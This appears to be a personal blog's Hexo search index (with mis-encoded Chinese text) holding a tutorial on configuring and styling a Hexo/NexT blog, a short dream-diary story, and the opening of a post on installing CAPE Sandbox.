<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hexo &amp; Next åšå®¢é…ç½®ä¸ç¾åŒ–</title>
    <url>/2023/01/10/blog1/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
é‰´äºæˆ‘è‡ªå·±çš„åˆ›ä½œæ¬²ï¼Œå‡†å¤‡æ­£å¼åœ°ç»è¥æˆ‘çš„åšå®¢XD
</blockquote>

<span id="more"></span>
<h1 id="0x0-è¯´åœ¨å‰é¢"><a href="#0x0-è¯´åœ¨å‰é¢" class="headerlink" title="0x0 è¯´åœ¨å‰é¢:"></a>0x0 è¯´åœ¨å‰é¢:</h1><blockquote>
<p>ç¯å¢ƒï¼šWin11<br>å‚è€ƒèµ„æ–™ï¼šCodeSheepå¸ˆå‚…åœ¨bç«™ä¸Šçš„è§†é¢‘ &amp; Nextå®˜æ–¹æ–‡æ¡£</p>
<p>åœ¨é…ç½®çš„è¿‡ç¨‹ä¸­ç»å¸¸å¿˜è®°è‡ªå·±é…äº†ä»€ä¹ˆï¼Œå¯¼è‡´è¿™ç¯‡åšå®¢å¯èƒ½ä¸æ˜¯å¾ˆå…¨ï¼Œåç»­æ¢ç”µè„‘é‡é…ç¯å¢ƒæ—¶å†è¡¥å……XD</p>
</blockquote>
<h1 id="0x1-Hexoåˆå§‹åŒ–ä¸€ä¸ªåšå®¢"><a href="#0x1-Hexoåˆå§‹åŒ–ä¸€ä¸ªåšå®¢" class="headerlink" title="0x1 Hexoåˆå§‹åŒ–ä¸€ä¸ªåšå®¢"></a>0x1 Hexoåˆå§‹åŒ–ä¸€ä¸ªåšå®¢</h1><p>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦åœ¨<a href="https://nodejs.org/en/">Node.jså®˜ç½‘</a>ä¸­ä¸‹è½½nodejs</p>
<p>å…¶æ¬¡ï¼Œåœ¨ç»ˆç«¯è¾“å…¥<code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code></p>
<blockquote>
<p>ğŸ‘†è¿™ä¸€æ­¥å…¶å®å¯æœ‰å¯æ— ï¼Œåªä¸è¿‡æ¢åˆ°æ·˜å®é•œåƒæºä»¥åcnpmçš„å®‰è£…é€Ÿåº¦æ›´å¿«ä¸€äº›</p>
</blockquote>
<p>è¾“å…¥<code>cnpm -install -g hexo-cli</code>å®‰è£…hexoæ¡†æ¶ï¼Œè¿™æ ·hexoå°±å®‰è£…å¥½å•¦XD</p>
<hr>
<p>å»ºç«‹ä¸€ä¸ªç©ºæ–‡ä»¶å¤¹ï¼Œå¹¶åœ¨å‘½ä»¤è¡ŒæŒ‰åºè¾“å…¥<code>hexo init</code>,è¿™æ ·æœ¬åœ°çš„åšå®¢å°±æ­å»ºå¥½å•¦XD</p>
<p>æ‰“å¼€è‡ªå·±çš„Githubï¼Œåˆ›å»ºä¸€ä¸ªæ–°ä»“åº“ï¼Œåå­—ä¸º<code>ä¸ªäººåç§°.github.io</code></p>
<p>åœ¨ç»ˆç«¯è¾“å…¥<code>cnpm install --save hexo-deployer-git</code>å®‰è£…éƒ¨ç½²å™¨</p>
<p>æ‰“å¼€<strong><em>ç«™ç‚¹é…ç½®æ–‡ä»¶</em></strong>ï¼Œä¿®æ”¹Deploymentä¸‹çš„é…ç½®<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="line">deploy:</span><br><span class="line">Â  type: git</span><br><span class="line">Â  repo:https://github.com/GithubName/GithubName.github.io.git</span><br><span class="line">Â  branch: main</span><br></pre></td></tr></table></figure></p>
<p>ç»§ç»­åœ¨ç©ºæ–‡ä»¶å¤¹æ‰“å¼€ç»ˆç«¯ï¼Œè¾“å…¥<code>hexo g</code>å’Œ<code>hexo d</code>åšå®¢å°±èƒ½éƒ¨ç½²åˆ°è¿œç«¯å•¦XD</p>
<blockquote>
<p>è¿™é‡Œæˆ‘ä¹‹å‰æ˜¯é…ç½®è¿‡è´¦æˆ·å’Œå¯†ç çš„ï¼Œæ‰€ä»¥æ²¡æœ‰å¼¹å‡ºé…ç½®çš„é—®é¢˜ï¼Œå½“æ—¶ä¹Ÿæ˜¯ç¨€é‡Œç³Šæ¶‚å°±å¼„å¥½äº†ï¼Œå¯¼è‡´ç°åœ¨ä¸å¤ªæ¸…æ¥šåˆ°åº•å‘ç”Ÿäº†ä»€ä¹ˆï¼Œå°±æ²¡åŠæ³•å¤ç›˜ï¼Œç­‰åé¢æ¢æ–°ç”µè„‘å†è¯´å§XD</p>
</blockquote>
<h1 id="0x2-Hexo-config-amp-Theme-config"><a href="#0x2-Hexo-config-amp-Theme-config" class="headerlink" title="0x2 Hexo config &amp; Theme config"></a>0x2 Hexo config &amp; Theme config</h1><p>æˆ‘ä½¿ç”¨çš„è¿™ä¸€ä¸ªä¸»é¢˜ğŸ‘‡ï¼Œè¿™é‡Œå…·ä½“è®²è®²åšå®¢çš„é…ç½®<br><a href="http://theme-next.iissnan.com/">NexT ä½¿ç”¨æ–‡æ¡£ (iissnan.com)</a><br>ä¸ºäº†æè¿°æ–¹ä¾¿ï¼Œåœ¨ä»¥ä¸‹è¯´æ˜ä¸­ï¼š<br>å°†<strong><em>hexo initç”Ÿæˆçš„configæ–‡ä»¶</em></strong>ç§°ä¸º<code>ç«™ç‚¹é…ç½®æ–‡ä»¶</code><br>å°†<strong><em>themeçš„configæ–‡ä»¶</em></strong>ç§°ä¸º<code>ä¸»é¢˜é…ç½®æ–‡ä»¶</code></p>
<hr>
<ul>
<li>é…ç½®ä¸»é¢˜<br>åœ¨hexoç«™ç‚¹ç›®å½•ä¸­ç”¨ç»ˆç«¯è¾“å…¥ğŸ‘‡<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/iissnan/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>
æ‰“å¼€<strong><em>ç«™ç‚¹é…ç½®æ–‡ä»¶</em></strong>ï¼Œä¿®æ”¹:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">theme: next</span><br></pre></td></tr></table></figure></li>
<li>ä¸ªäººåå¥½-<strong><em>ä¸»é¢˜é…ç½®æ–‡ä»¶</em></strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Schemes</span><br><span class="line">scheme: Muse</span><br><span class="line"># scheme: Mist</span><br><span class="line"># scheme: Pisces</span><br><span class="line"># scheme: Gemini</span><br></pre></td></tr></table></figure></li>
<li>ç«™ç‚¹å›¾åƒ-<strong><em>ä¸»é¢˜é…ç½®æ–‡ä»¶</em></strong><br>ä¿®æ”¹ä¹‹å‰è®°å¾—åœ¨themes\\next\source\imagesæ–‡ä»¶å¤¹ä¸­ä¿å­˜å¥½ä½ è¦ä¸Šä¼ çš„å›¾åƒï¼Œå›¾åƒå°ºå¯¸è¦ç¬¦åˆ16x16å’Œ32x32<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">favicon:</span><br><span class="line">Â  small: /images/favicon-16x16.png</span><br><span class="line">Â  medium: /images/favicon-32x32.png</span><br><span class="line">Â  apple_touch_icon: /images/apple-touch-icon-next.png</span><br><span class="line">Â  safari_pinned_tab: /images/logo.svg</span><br><span class="line">Â  #android_manifest: /images/manifest.json</span><br><span class="line">Â  #ms_browserconfig: /images/browserconfig.xml</span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<ul>
<li>ç¤¾äº¤é“¾æ¥-<strong><em>ä¸»é¢˜é…ç½®æ–‡ä»¶</em></strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Social Links</span><br><span class="line"># Usage: `Key: permalink || icon`</span><br><span class="line"># Key is the link label showing to end users.</span><br><span class="line"># Value before `||` delimiter is the target permalink, value after `||` delimiter is the name of Font Awesome icon.</span><br><span class="line">social:</span><br><span class="line">Â  GitHub: https://github.com/HeyGap || fab fa-github</span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<ul>
<li>æœç´¢:å…ˆåœ¨ç«™ç‚¹ç›®å½•ä¸‹å®‰è£…<code>npm install hexo-generator-searchdb --save</code></li>
</ul>
<p><strong><em>ç«™ç‚¹é…ç½®æ–‡ä»¶</em></strong><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">local_search:</span><br><span class="line">Â  enable: true</span><br></pre></td></tr></table></figure><br><strong><em>ä¸»é¢˜é…ç½®æ–‡ä»¶</em></strong>ï¼šæ·»åŠ <br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search:</span><br><span class="line">Â  path: search.xml</span><br><span class="line">Â  field: post</span><br><span class="line">Â  format: html</span><br><span class="line">Â  limit: 10000</span><br></pre></td></tr></table></figure></p>
<hr>
<ul>
<li>å¼•ç”¨ç¤ºä¾‹<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;blockquote class=&quot;blockquote-center&quot;&gt;</span><br><span class="line">é¡ä¸æœ‰åˆ é²œå…‹æœ‰ç»ˆ</span><br><span class="line">&lt;p&gt;&lt;p&gt;</span><br><span class="line">&lt;br&gt;ã€Šè¯—ç»ã€‹</span><br><span class="line">&lt;/blockquote&gt;</span><br></pre></td></tr></table></figure>
<blockquote class="blockquote-center">
é¡ä¸æœ‰åˆ é²œå…‹æœ‰ç»ˆ
<p><p>
<br>ã€Šè¯—ç»ã€‹
</blockquote>

</li>
</ul>
<hr>
<ul>
<li>æ›´å¤§æ›´æœ‰å¸å¼•åŠ›çš„å›¾ç‰‡æ¥æºäº<code>&lt;img src=&quot;/image-url&quot; class=&quot;full-image&quot; /&gt;</code></li>
</ul>
<hr>
<ul>
<li>Bootstrap Calloutä½¿ç”¨æ–¹å¼</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% note class_name %&#125; Content (md partial supported) &#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­ï¼Œ<code>class_name</code> å¯ä»¥æ˜¯ä»¥ä¸‹åˆ—è¡¨ä¸­çš„ä¸€ä¸ªå€¼ï¼š</p>
<div class="note default">
            <p>default </p>
          </div>
<div class="note primary">
            <p>primary </p>
          </div>
<div class="note success">
            <p>success </p>
          </div>
<div class="note info">
            <p>info </p>
          </div>
<div class="note warning">
            <p>warning </p>
          </div>
<div class="note danger">
            <p>danger </p>
          </div>
<hr>
<h1 id="0x3-LaTexé…ç½®"><a href="#0x3-LaTexé…ç½®" class="headerlink" title="0x3 LaTexé…ç½®"></a>0x3 LaTexé…ç½®</h1><blockquote>
<p>æˆ‘è¿™è¾¹pandocæ€»æ˜¯å‡ºé”™ï¼Œäºæ˜¯è½¬ç”¨äº†kramed</p>
</blockquote>
<p>ç»ˆç«¯è¾“å…¥<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cnpm uninstall hexo-renderer-marked --save</span><br><span class="line">cnpm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure></p>
<p><strong><em>ä¸»é¢˜é…ç½®æ–‡ä»¶</em></strong></p>
<blockquote>
<p>ä¸ºäº†åŠ å¿«æ¸²æŸ“é€Ÿåº¦ï¼Œper_pageæˆ‘é€‰çš„trueï¼Œå¦‚æœå«Œéº»çƒ¦å¯ä»¥ç›´æ¥false</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">math:</span><br><span class="line">Â  # Default (true) will load mathjax / katex script on demand.</span><br><span class="line">Â  # That is it only render those page which has `mathjax: true` in Front-matter.</span><br><span class="line">Â  # If you set it to false, it will load mathjax / katex srcipt EVERY PAGE.</span><br><span class="line">Â  per_page: true</span><br><span class="line">Â  </span><br><span class="line">Â  # hexo-renderer-pandoc (or hexo-renderer-kramed) required for full MathJax support.</span><br><span class="line">Â  mathjax:</span><br><span class="line">Â  Â  enable: true</span><br><span class="line">Â  Â  # See: https://mhchem.github.io/MathJax-mhchem/</span><br><span class="line">Â  Â  mhchem: false</span><br></pre></td></tr></table></figure>
<p>è®°å¾—åœ¨éœ€è¦æ¸²æŸ“çš„mdåŠ å…¥<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mathjax: true</span><br></pre></td></tr></table></figure></p>
<p>Test the $X_{n-1}$</p>
<blockquote>
<p>ä¸è¿‡æ¸²æŸ“åå°±å¯¼è‡´å†™mdæ—¶å¤šäº†å‡ ä¸ªè§„çŸ©</p>
<ol>
<li>â€”-çš„ä¸Šä¸‹å¿…é¡»å„ç©ºä¸€æ ¼</li>
</ol>
</blockquote>
<p><a href="https://www.luogu.com.cn/blog/over-knee-socks/latex-gong-shi-tai-quan-fixed">ã€å…¬å¼ã€‘KaTeX ä½¿ç”¨æŒ‡å—ï¼ˆæ´›è°·ç‰¹ä¾›ï¼‰ - ç™½è‰²è¿‡è†è¢œ - æ´›è°·åšå®¢ (luogu.com.cn)</a></p>
<h1 id="0x4-Hexo-x-Next-ç¾åŒ–"><a href="#0x4-Hexo-x-Next-ç¾åŒ–" class="headerlink" title="0x4 Hexo x Next ç¾åŒ–"></a>0x4 Hexo x Next ç¾åŒ–</h1><ul>
<li>åŠ¨æ€èƒŒæ™¯<br>åœ¨<strong><em>ç«™ç‚¹ç›®å½•</em></strong>æ‰“å¼€gitï¼Œè¾“å…¥<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/theme-next/theme-next-canvas-nest themes/next/source/lib/canvas-nest</span><br></pre></td></tr></table></figure>
åœ¨<strong><em>ä¸»é¢˜é…ç½®æ–‡ä»¶</em></strong>ä¸­åŠ å…¥<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">canvas_nest: # ç½‘ç»œèƒŒæ™¯</span><br><span class="line">  enable: true</span><br><span class="line">  onmobile: true # display on mobile or not</span><br><span class="line">  color: &#x27;0,0,0&#x27; # RGB values, use &#x27;,&#x27; to separate</span><br><span class="line">  opacity: 0.5 # the opacity of line: 0~1</span><br><span class="line">  zIndex: -1 # z-index property of the background</span><br><span class="line">  count: 150 # the number of lines</span><br></pre></td></tr></table></figure>
</li>
</ul>
<blockquote>
<p>è®°å¾—æŠŠå…¶ä»–çš„åŠ¨æ€èƒŒæ™¯å…³é—­å‘€ï¼Œæ¯”å¦‚</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">three:</span><br><span class="line">  enable: false</span><br><span class="line">  three_waves: false</span><br><span class="line">Â  canvas_lines: true</span><br><span class="line">Â  canvas_sphere: false</span><br><span class="line">canvas_ribbon:</span><br><span class="line">Â  enable: false</span><br></pre></td></tr></table></figure>
<hr>
<ul>
<li>æ–‡ç« ç»“å°¾<br>åœ¨è·¯å¾„ <code>\themes\next\layout\_macro</code> ä¸­æ–°å»º <code>passage-end-tag.swig</code> æ–‡ä»¶,å¹¶æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &#123;% if not is_index %&#125;</span><br><span class="line">        &lt;div style=&quot;text-align:center;color: #ccc;font-size:14px;&quot;&gt;-------------æ–‡ç« å°±åˆ°è¿™é‡Œå•¦ï¼&lt;i class=&quot;fa fa-paw&quot;&gt;&lt;/i&gt;æ„Ÿè°¢æ‚¨çš„é˜…è¯»XD-------------&lt;/div&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
æ¥ç€æ‰“å¼€<code>\themes\next\layout\_macro\post.swig</code>æ–‡ä»¶ï¼Œåœ¨<code>post-body</code> ä¹‹å(<code>END POST BODY</code>)ï¼Œ <code>post-footer</code> ä¹‹å‰æ·»åŠ ä»¥ä¸‹ä»£ç :<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt; </span><br><span class="line">	&#123;% if not is_index %&#125; </span><br><span class="line">		&#123;% include &#x27;passage-end-tag.swig&#x27; %&#125; </span><br><span class="line">	&#123;% endif %&#125; </span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
ç„¶åæ‰“å¼€<strong><em>ä¸»é¢˜é…ç½®æ–‡ä»¶</em></strong>ï¼Œåœ¨æœ«å°¾æ·»åŠ ï¼š<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">passage_end_tag: </span><br><span class="line">  enabled: true</span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<ul>
<li>è´´ä¸€ä¸ª<a href="https://fontawesome.dashgame.com/">å›¾æ ‡åº“Font Awesome)</a>ï¼Œ<strong><em>ä¸»é¢˜é…ç½®æ–‡ä»¶</em></strong>é‡Œçš„åœ¨çº¿å›¾æ ‡åŸºæœ¬éƒ½è¦ç”¨åˆ°å®ƒ</li>
</ul>
<hr>
<ul>
<li>ä»£ç å—å¤åˆ¶<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_theme: night</span><br><span class="line">codeblock:</span><br><span class="line">  border_radius:</span><br><span class="line">  copy_button:</span><br><span class="line">    enable: true</span><br><span class="line">    show_result: true</span><br><span class="line">    # Available values: default | flat | mac</span><br><span class="line">Â  Â  style: mac</span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<ul>
<li>å›åˆ°é¡¶éƒ¨ä¸é˜…è¯»è¿›åº¦<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">back2top:</span><br><span class="line">Â  enable: true</span><br><span class="line">Â  # Back to top in sidebar.</span><br><span class="line">Â  sidebar: false</span><br><span class="line">Â  # Scroll percent label in b2t button.</span><br><span class="line">Â  scrollpercent: true</span><br><span class="line">  </span><br><span class="line"># Reading progress bar</span><br><span class="line">reading_progress:</span><br><span class="line">Â  enable: true</span><br><span class="line">Â  # Available values: top | bottom</span><br><span class="line">Â  position: top</span><br><span class="line">Â  color: &quot;#7B68EE&quot;</span><br><span class="line">Â  height: 3px</span><br></pre></td></tr></table></figure>
é™„ä¸€äº›å‚è€ƒèµ„æ–™XD~</li>
</ul>
<p><a href="https://baike.baidu.com/item/%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E9%A2%9C%E8%89%B2%E7%A0%81#:~:text=%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E9%A2%9C%E8%89%B2%E7%A0%81%E5%B0%B1%E6%98%AF%E5%9C%A8%E8%BD%AF%E4%BB%B6%E4%B8%AD%E8%AE%BE%E5%AE%9A%E9%A2%9C%E8%89%B2%E5%80%BC%E7%9A%84%E4%BB%A3%E7%A0%81%E3%80%82%E5%9C%A8%E5%BE%88%E5%A4%9A%E8%BD%AF%E4%BB%B6%E4%B8%AD%EF%BC%8C%E9%83%BD%E4%BC%9A%E9%81%87%E5%88%B0%E8%AE%BE%E5%AE%9A%E9%A2%9C%E8%89%B2%E5%80%BC%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%8C%E5%8F%91%E5%B1%95%E6%9D%A5%E6%BA%90%20%E4%BA%BA%E7%9A%84%E7%9C%BC%E7%9D%9B%E7%9C%8B%E5%88%B0%E7%9A%84%E9%A2%9C%E8%89%B2%E6%9C%89%E4%B8%A4%E7%A7%8D%EF%BC%9A,%E4%B8%80%E7%A7%8D%E6%98%AF%E5%8F%91%E5%85%89%E4%BD%93%E5%8F%91%E5%87%BA%E7%9A%84%E9%A2%9C%E8%89%B2%EF%BC%8C%E6%AF%94%E5%A6%82%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%98%BE%E7%A4%BA%E5%99%A8%E5%B1%8F%E5%B9%95%E6%98%BE%E7%A4%BA%E7%9A%84%E9%A2%9C%E8%89%B2%EF%BC%9B%20%E5%8F%A6%E4%B8%80%E7%A7%8D%E6%98%AF%E7%89%A9%E4%BD%93%E6%9C%AC%E8%BA%AB%E4%B8%8D%E5%8F%91%E5%85%89%EF%BC%8C%E8%80%8C%E6%98%AF%E5%8F%8D%E5%B0%84%E7%9A%84%E5%85%89%E4%BA%A7%E7%94%9F%20%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E9%A2%9C%E8%89%B2%E3%80%82">åå…­è¿›åˆ¶é¢œè‰²ç _ç™¾åº¦ç™¾ç§‘ (baidu.com)</a></p>
<hr>
<ul>
<li>å¢åŠ é˜…è¯»æ¬¡æ•°/æ—¶é•¿å’Œè®¿å®¢æ•°-<strong><em>ä¸»é¢˜é…ç½®æ–‡ä»¶</em></strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">busuanzi_count:</span><br><span class="line">  enable: true  #æ˜¯å¦å¼€å¯ä¸è’œå­ç»Ÿè®¡åŠŸèƒ½</span><br><span class="line">  total_visitors: true #æ˜¯å¦ç»Ÿè®¡æ€»è®¿å®¢æ•°</span><br><span class="line">  total_visitors_icon: user #è®¿å®¢æ•°å›¾æ ‡ä¸ºäººåƒ</span><br><span class="line">  total_views: true #æ˜¯å¦åŒçº§æ€»è®¿é—®æ•°</span><br><span class="line">  total_views_icon: eye #è®¿é—®æ•°å›¾æ ‡ä¸ºçœ¼ç›</span><br><span class="line">  post_views: true #æ˜¯å¦ç»Ÿè®¡æ–‡ç« è®¿é—®æ•°</span><br><span class="line">  post_views_icon: eye #è®¿é—®æ•°å›¾æ ‡ä¸ºçœ¼ç›</span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<ul>
<li>é“¾æ¥æ ·å¼<br>ä¿®æ”¹æ–‡ä»¶ <code>themes\next\source\css\_common\components\post\post.styl</code>ï¼Œåœ¨æœ«å°¾æ·»åŠ å¦‚ä¸‹cssæ ·å¼ï¼š<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.post-body p a&#123;</span><br><span class="line">  color: #0593d3;</span><br><span class="line">  border-bottom: none;</span><br><span class="line">  border-bottom: 1px solid #0593d3;</span><br><span class="line">  &amp;:hover &#123;</span><br><span class="line">    color: #6A5ACD;</span><br><span class="line">    border-bottom: none;</span><br><span class="line">    border-bottom: 1px solid #fc6423;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<p>å‚è€ƒæ–‡ç« ğŸ‘‡</p>
<p><a href="https://www.mickeymiao.top/posts/f9b8ceb/">hexo NexTä¸»é¢˜ç¾åŒ–æ€»ç»“ | MickeyMiao</a></p>
<p>æ·±åº¦ç¾åŒ–-æ”¾ç€åƒç°</p>
<p><a href="https://blog.csdn.net/maosidiaoxian/article/details/85220394">å¦‚ä½•åœ¨Hexoä¸­å¯¹æ–‡ç« mdæ–‡ä»¶åˆ†ç±»_è²Œä¼¼æ‰çº¿çš„åšå®¢-CSDNåšå®¢</a><br><a href="https://zhuanlan.zhihu.com/p/64965187">ä½¿ç”¨ Hexo Hey ç®¡ç†ä½ çš„åšå®¢ - çŸ¥ä¹ (zhihu.com)</a></p>
]]></content>
      <categories>
        <category>Environment</category>
      </categories>
      <tags>
        <tag>tech, Blog</tag>
      </tags>
  </entry>
  <entry>
    <title>å¼‚ä¸–ç•Œè§é—»å½•(2)</title>
    <url>/2023/10/07/blog11/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
ç™¸å¯å¹´å…«æœˆå»¿äºŒå¤œè®°æ¢¦
</blockquote>

<span id="more"></span>
<p>è¿™ä¸ªä¸–ç•Œçš„ç”Ÿç‰©å˜å¼‚é€Ÿåº¦æå¿«ï¼Œé™¤äº†äººç±»ã€‚<br>åŸå¸‚ä¸­çš„å¹¢å¹¢é’¢é“å·¨å…½åªå‰©ä¸‹æ–­å£æ®‹å£ï¼Œæ˜”æ—¥çš„æ‘©å¤©å¤§æ¥¼ç°åœ¨åªæœ‰ä¸ƒå…«ç±³é«˜ï¼Œæ¤ç‰©ç¼ ç»•åœ¨ç°è‰²çš„åºŸå¢Ÿä¸Šï¼Œé¢œè‰²å„å¼‚çš„è—¤è”“é•¿æ»¡äº†è„“åŒ…ï¼Œé‡Œé¢å¶å°”å–·å‡ºä»¤äººä½œå‘•çš„ç˜´æ°”ã€‚<br>æˆ‘è¢«æ´¾å¾€å…¬å¸é™„è¿‘çš„ä¸€æ ‹ä¸‰å››å±‚é«˜çš„å†™å­—æ¥¼ä¸­æ¸…ç†éšæ‚£ï¼ŒåŒè¡Œçš„è¿˜æœ‰å‡ ä½åŒäº‹ï¼Œä¸è¿‡æˆ‘çš„æ„è¯†å¾ˆæ¨¡ç³Šï¼Œå·²ç»è®°ä¸å¾—ä»–ä»¬çš„æ¨¡æ ·äº†ã€‚<br>å¤©æ°”ä»ç„¶ä¸å¥½ï¼Œä¹Œäº‘è®©æœ¬å°±é»‘æš—çš„æ¥¼é“æ˜¾å¾—æ›´åŠ é˜´æ£®ã€‚<br>å¹¸è¿çš„æ˜¯ï¼Œä¸Šæ¥¼æœŸé—´å¹¶æ²¡æœ‰é‡åˆ°ä»€ä¹ˆå±é™©ï¼Œæˆ‘ä»¬é©¬ä¸Šå°±çœ‹åˆ°äº†æ­¤æ¬¡è¦æ¸…ç†çš„â€éšæ‚£â€â€”â€”æˆ‘ç°åœ¨åªè®°å¾—é‚£æ˜¯ä¸€ä¸ªäººå‹ç”Ÿç‰©ã€‚<br>æ‹”å‡ºæ‰‹æªï¼Œæˆ‘ä»¬é è¿‘é‚£ä¸ªäººå‹ç”Ÿç‰©ã€‚å®ƒèƒŒå¯¹ç€æˆ‘ä»¬ï¼Œä½†èº«åå´åƒæ˜¯é•¿äº†çœ¼ç›ï¼Œåœ¨æˆ‘ä»¬å‘å®ƒè¿ˆå‡ºç¬¬ä¸€æ­¥æ—¶ï¼Œå®ƒç¬é—´ä»¥ä¸€ç§å¥‡æ€ªçš„å§¿åŠ¿é£å¥”ä¸Šæ¥¼ã€‚<br>æˆ‘é©¬ä¸Šè·Ÿäº†ä¸Šå»ï¼Œæ¥åˆ°äº†å¤©å°â€”â€”è¿™é‡Œæœ¬åº”è¯¥æ˜¯è¿™æ ‹å†™å­—æ¥¼çš„å››æ¥¼ã€‚<br>å®ƒå°±ç«™åœ¨å¤©å°è¾¹ç¼˜ï¼Œä»ç„¶èƒŒå¯¹ç€æˆ‘ã€‚<br>æˆ‘è·Ÿå®ƒäº¤æµäº†ä¸€æ®µæ—¶é—´ï¼Œä½†å¿˜è®°è·Ÿå®ƒè¯´äº†äº›ä»€ä¹ˆã€‚<br>å®ƒè·³äº†ä¸‹å»ï¼Œåœ¨ç©ºä¸­çˆ†å¼€ï¼Œäº”é¢œå…­è‰²çš„è¡€å–·æº…åœ¨åœ°é¢çš„æ¤ç‰©ä¸Šï¼Œåˆå¾ˆå¿«è¢«è •åŠ¨çš„è—¤è”“å¸æ”¶ã€‚<br>æˆ‘æ„Ÿè§‰æ„è¯†æœ‰äº›ææƒšï¼Œä¾¿åŸè·¯è¿”å›åœ°é¢ï¼ŒåŒäº‹ä»¬éƒ½ä¸è§äº†ï¼Œæˆ‘å°±é¡ºç€æ¥æ—¶çš„è·¯å›åˆ°å…¬å¸ã€‚<br>è·¯ä¸Šçœ‹è§ä¸€ç‰‡ç»¿æ²¹æ²¹çš„è—¤è”“ï¼Œä¸Šé¢ç»“ç€æ©™è‰²çš„æœå®ï¼Œè¿™å¥½åƒæ˜¯æ©˜å­ï¼Œä½†è¿™æ©˜å­è‡ªå·±ä¼šçˆ†å¼€ï¼Œç„¶åæŠŠç§å­ç”©å‘å››å‘¨ã€‚<br>æ©˜å­çš„ç§å­æ¥è§¦åˆ°å…¶ä»–ç”Ÿç‰©ä»¥åï¼Œè¿…é€Ÿå¸æ”¶äº†è¿™äº›ç”Ÿç‰©çš„ç”Ÿå‘½ã€‚æˆ‘è¿˜è®°å¾—è·¯æ—ä¸€æ£µä¸¤äººåˆæŠ±çš„å¤§æ ‘åœ¨è¢«å¯„ç”Ÿåè¿…é€Ÿæ‰å…‰äº†æ‰€æœ‰å¶å­ï¼Œæ ‘çš®å¹²ç˜ªä¸‹å»ï¼Œé‚£ä¸Šé¢é“é“çš±çº¹æŒ¤åœ¨ä¸€èµ·ï¼Œä»¤äººå¾ˆä¸èˆ’æœã€‚<br>è¿™æ©˜å­è—¤å°±åœ¨å…¬å¸é™„è¿‘ï¼Œæˆ‘èº²å¼€å‡ ç²’çˆ†å‡ºçš„æ©˜å­ç§ï¼Œè¿…é€Ÿå›åˆ°å…¬å¸ï¼Œç„¶åä¾¿å¤±å»äº†æ„è¯†ã€‚  </p>
]]></content>
      <categories>
        <category>sketch</category>
      </categories>
  </entry>
  <entry>
    <title>capeSandboxå®‰è£…ä¸ä½¿ç”¨</title>
    <url>/2023/10/02/blog10/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
å­¦ä¹ ä¸€ä¸‹cape Sandbox
</blockquote>

<span id="more"></span>
<h1 id="0xFF-ç‰©ç†æœºç¯å¢ƒè¯´æ˜"><a href="#0xFF-ç‰©ç†æœºç¯å¢ƒè¯´æ˜" class="headerlink" title="0xFF ç‰©ç†æœºç¯å¢ƒè¯´æ˜"></a>0xFF ç‰©ç†æœºç¯å¢ƒè¯´æ˜</h1><p>x64, Windos11, 16G</p>
<h1 id="0x00-cape-Sandboxç¯å¢ƒä¸å®‰è£…-æš‚æ—¶å¼ƒç”¨ï¼Œå‹¿çœ‹"><a href="#0x00-cape-Sandboxç¯å¢ƒä¸å®‰è£…-æš‚æ—¶å¼ƒç”¨ï¼Œå‹¿çœ‹" class="headerlink" title="0x00 cape Sandboxç¯å¢ƒä¸å®‰è£…(æš‚æ—¶å¼ƒç”¨ï¼Œå‹¿çœ‹)"></a>0x00 cape Sandboxç¯å¢ƒä¸å®‰è£…(æš‚æ—¶å¼ƒç”¨ï¼Œå‹¿çœ‹)</h1><ul>
<li><strong>ç¯å¢ƒ</strong><ul>
